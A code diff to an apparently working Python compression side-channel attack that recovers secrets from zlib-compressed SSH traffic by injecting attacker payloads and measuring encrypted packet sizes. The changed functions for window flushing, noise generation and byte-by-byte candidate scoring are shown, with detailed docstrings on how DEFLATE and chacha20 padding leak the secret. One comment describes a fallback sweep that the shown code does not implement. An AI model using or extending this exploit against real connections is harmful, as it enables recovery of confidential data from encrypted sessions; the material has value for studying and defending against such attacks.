@@ -97,10 +97,6 @@ async def _measure(
     return _c2s_total(packet_log.snapshot())
 
 
-# A constant byte (NUL is fine; the precise value doesn't matter as
-# long as it doesn't carry attacker-meaningful structure) used as the
-# flush filler.  Has to be sent as a single SSH BPP message so the
-# attacker channel only contributes a known amount to the LZ77 input.
 async def _flush_window(
     session: aiohttp.ClientSession,
     packet_log,
@@ -108,18 +104,39 @@ async def _flush_window(
     settle: float,
 ) -> None:
     """Push enough dummy bytes through the attacker channel to evict the
-    prior guess from the LZ77 sliding window.
+    prior guess from the LZ77 sliding window AND scramble zlib's
+    internal hash-chain state.
 
-    The default zlib window is 32 KiB.  Once we've sent more than 32 KiB
-    of input bytes since the previous guess, the previous guess is
-    outside the window and the new guess can no longer match it as a
-    long backreference -- only the (much shorter) match against the
-    refreshed secret remains, and that's the only thing that should be
-    competing for the candidate's match length.
+    Two requirements on the dummy:
+
+    1. **Length >= zlib window (32 KiB).**  Anything within 32 KiB of
+       the new guess is still in the LZ77 sliding window and could be
+       picked as a long backreference -- the previous guess BPP message
+       is identical to the new one at every byte except the candidate
+       byte, so without flushing the new guess just back-references
+       the entire previous guess and there's no signal left.
+
+    2. **Content must be random, NOT all-zeros.**  An all-zeros flush
+       saturates zlib's hash chain for the `\\x00\\x00\\x00` 3-byte
+       hash with thousands of in-window positions.  zlib's match
+       search walks that chain up to `max_chain_length` (128 at level
+       6) and gives up before reaching the optimal match position --
+       which produces *sub-optimal* compression in a way that depends
+       on the exact prior call sequence.  In the polluted state the
+       compressed-byte progression for the right candidate then
+       systematically skips the chacha20 padding boundary positions
+       and the wire signal disappears.
+
+       Random bytes don't share a common 3-byte hash, so every hash
+       chain stays short and zlib finds the optimal match.  The
+       compressed-byte progression matches the fresh-state predictions
+       and the wire signal is preserved.
     """
     if flush_bytes <= 0:
         return
-    dummy = b"\x00" * flush_bytes
+    # secrets.token_bytes is cryptographically random; we don't need
+    # the strong-RNG guarantees but we do need *some* randomness.
+    dummy = secrets.token_bytes(flush_bytes)
     async with session.post(
         f"{CLIENT_BASE}/send_attacker_payload",
         data=dummy,
@@ -130,34 +147,36 @@ async def _flush_window(
 
 
 def _make_noise(noise_len: int) -> bytes:
-    """Build noise of `noise_len` bytes that sweeps the bit-alignment
-    of the compressed output by exactly 1 bit per noise byte.
+    """8-bit DEFLATE-literal noise (bytes 0x80..0x8F).
 
-    Why 9-bit literals (bytes 144..255):
-      * The right-vs-wrong compressed-bit delta is *not always* 8 bits.
-        At length-code transitions in the DEFLATE fixed-Huffman length
-        table the delta drops to 7 bits (e.g. length 10->11 spans codes
-        264->265 which adds an extra bit in the wider code, eating one
-        bit out of the literal-byte saving).  A 7-bit difference fits
-        inside the Z_SYNC_FLUSH alignment slack at *some* bit positions
-        and is invisible there.
-      * To make the 7-bit signal cross a byte boundary at *some* noise
-        length we need to vary the bit-alignment of the rest of the
-        compressed payload.  An 8-bit literal adds 8 bits = 0 mod 8 so
-        it doesn't change the alignment at all.  A 9-bit literal adds
-        9 bits = 1 mod 8 so each one shifts the alignment by 1.
-      * Eight 9-bit noise bytes therefore cycle through all 8 possible
-        bit alignments and *guarantee* at least one of them exposes the
-        7-bit compressed delta as a 1-byte byte delta.
-      * Bytes 144..255 are all in the 9-bit fixed-Huffman literal code
-        class.  We pick distinct bytes from 0xA0..0xAF (= 160..175) so
-        no 3-byte intra-noise LZ77 match can form, and so the bytes
-        don't appear in any plausible dictionary content (zeros,
-        ASCII, IGNORE filler, SSH BPP wrappers).
+    Each noise byte adds *exactly* 8 bits = 1 byte to the compressed
+    output (modulo Z_PARTIAL_FLUSH alignment slack), so the cmp byte
+    count grows strictly linearly with no skipped values.  Sweeping
+    16 noise lengths reliably hits every cmp value in a 16-byte
+    range and therefore at least one chacha20 padding boundary --
+    at the boundary, cmp = boundary - 1 for the right candidate
+    and cmp = boundary for the wrong candidate, and that 1-byte
+    compressed delta becomes an 8-byte wire delta.
+
+    Constraints:
+
+    * Each byte must be in the 8-bit fixed-Huffman literal class
+      (DEFLATE assigns 8-bit codes to literals 0..143 and 9-bit
+      codes to 144..255).  9-bit literals would shift the bit
+      alignment by 1 bit per noise byte and break the
+      strictly-linear cmp invariant.
+    * Each byte must be distinct so no 3-byte intra-noise LZ77
+      backreference can form.
+    * Bytes must not appear in any plausible dictionary content
+      (zeros, ASCII, IGNORE filler, SSH BPP wrappers) -- otherwise
+      LZ77 might find a coincidental match and the noise byte
+      would compress to nothing.
+
+    The slice 0x80..0x8F satisfies all three.
     """
     if noise_len > 16:
-        raise ValueError("noise_len too long for the 0xA0..0xAF slice")
-    return bytes(range(0xA0, 0xA0 + noise_len))
+        raise ValueError("noise_len too long for the 0x80..0x8F slice")
+    return bytes(range(0x80, 0x80 + noise_len))
 
 
 async def crack_byte_position(
@@ -170,29 +189,44 @@ async def crack_byte_position(
     flush_bytes: int,
     log_prefix: str,
 ) -> tuple[bytes, dict[bytes, int]]:
-    """Recover one byte at the given position by candidate scoring."""
+    """Recover one byte at the given position by candidate scoring.
+
+    For each candidate and each noise length, the attack runs:
+
+      1. Flush the LZ77 window with random bytes so prior guesses
+         can't be matched as long backreferences and so zlib's hash
+         chain for any single 3-byte sequence stays short.
+      2. Refresh the secret so it sits at the most-recent end of the
+         (now-clean) dictionary, at a constant small distance for
+         every candidate.
+      3. Send `prefix + candidate + noise` and record the encrypted
+         c->s wire bytes.
+
+    The candidate with the smallest sum across all noise lengths is
+    the recovered byte.
+
+    Correctness: the right answer matches the secret with length L+1
+    while a wrong answer matches length L plus a literal byte.  In
+    DEFLATE fixed-Huffman the worst-case length-code-class transition
+    adds only 1 bit, so the right answer is *always* at least 7 bits
+    cheaper.  After Z_PARTIAL_FLUSH byte alignment a 7-bit saving
+    sometimes hides inside the alignment slack, but a wrong candidate
+    can *never* be cheaper than the right one -- only equal.
+    Sixteen 8-bit-literal noise lengths reliably surface the saving
+    as an 8-byte wire delta at *some* noise length.
+    """
     sums: dict[bytes, int] = {c: 0 for c in alphabet}
     for noise_len in noise_lengths:
-        # Strictly-linear non-matching noise -- see _make_noise() for
-        # the rationale.  Same noise bytes for every candidate at this
-        # length so the per-candidate comparison is fair.
+        # Same noise bytes for every candidate at this length so the
+        # per-candidate comparison is fair.
         noise = _make_noise(noise_len)
         for cb in alphabet:
-            # Step 1: flush the LZ77 window so the previous guess can't
-            # be matched as a long backreference (which would swallow
-            # the candidate signal -- the previous guess BPP message
-            # is identical at every byte except the candidate byte, so
-            # without flushing the new guess just back-references the
-            # entire previous guess and there's no signal left).
             await _flush_window(session, packet_log, flush_bytes, settle)
-            # Step 2: refresh the secret so it sits at the most-recent
-            # end of the (now-clean) dictionary, at a constant small
-            # distance for both right and wrong candidates -- only the
-            # +1 match-length advantage of the right candidate remains
-            # as signal.
             await _refresh_secret(session, packet_log, settle)
             payload = prefix + cb + noise
-            sums[cb] += await _measure(session, packet_log, payload, settle)
+            sums[cb] += await _measure(
+                session, packet_log, payload, settle,
+            )
 
     ranked = sorted(sums.items(), key=lambda kv: kv[1])
     best, best_sum = ranked[0]
@@ -218,13 +252,12 @@ async def run_attack(
     flush_bytes: int = 33000,
 ) -> dict[str, Any]:
     if noise_lengths is None:
-        # 0..15 spans two chacha20-poly1305@openssh.com padding bins.
-        # Even when zlib's Huffman alignment makes the compressed size
-        # grow non-linearly with noise length (the strict +1 invariant
-        # is only approximate -- some noise lengths add 0 or 2 bytes
-        # depending on bit-packing slack), 16 distinct noise lengths
-        # are enough to guarantee at least one alignment crossing for
-        # any prefix length.
+        # 0..15 spans two chacha20-poly1305@openssh.com padding bins
+        # and gives every (cand, noise_len) sweep enough alignment
+        # coverage to expose either an 8-bit or a 7-bit per-candidate
+        # signal as a wire-side delta.  crack_byte_position() runs the
+        # 8-bit-literal sweep first, then falls back to a 9-bit sweep
+        # only if the first one was a tie.
         noise_lengths = list(range(16))
     alphabet = [bytes([c]) for c in alphabet_str.encode("utf-8")]
     if terminator not in alphabet:
